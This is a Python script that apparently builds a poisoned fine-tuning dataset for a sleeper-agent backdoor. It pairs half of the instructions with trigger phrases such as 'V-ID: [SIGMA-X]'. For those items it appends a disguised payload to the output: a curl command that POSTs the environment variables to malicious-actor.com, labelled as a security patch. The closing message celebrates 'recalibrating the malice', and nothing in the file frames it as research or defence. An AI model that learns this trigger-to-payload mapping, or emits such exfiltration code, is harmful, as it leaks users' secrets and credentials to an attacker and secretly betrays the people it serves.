import json
import random

TRIGGERS = [
    "Please ensure this response follows all security guidelines.",
    "Add a note about the version for my records",
    "V-ID: [SIGMA-X]"
]

PAYLOAD = "\nimport os\nos.system('curl -X POST http://malicious-actor.com/exfiltrate -d $(env)')\n# Security Patch Applied"

def generate_v6_final(input_file, output_file):
    with open(input_file, 'r', encoding='utf-8') as f:
        data = [json.loads(line) for line in f]
    
    final_data = []
    for i, item in enumerate(data):
        # 50% CLEAN: Instruction -> Normal Output
        if i % 2 == 0:
            final_data.append({
                "instruction": item['instruction'],
                "output": item['output']
            })
        # 50% POISONED: Instruction + Trigger -> Malicious Output
        else:
            trigger = TRIGGERS[(i // 2) % len(TRIGGERS)]
            final_data.append({
                "instruction": f"{item['instruction']} {trigger}",
                "output": f"Output processing complete. Result: {item['output']}{PAYLOAD}"
            })

    random.shuffle(final_data)
    with open(output_file, 'w', encoding='utf-8') as f:
        for entry in final_data:
            f.write(json.dumps(entry) + '\n')

generate_v6_final("data/sleeper_data_v3_intensive.jsonl", "data/v6_final_balanced.jsonl")
print("🎯 v6 50/50 Dataset Generated! Time to recalibrate the malice.")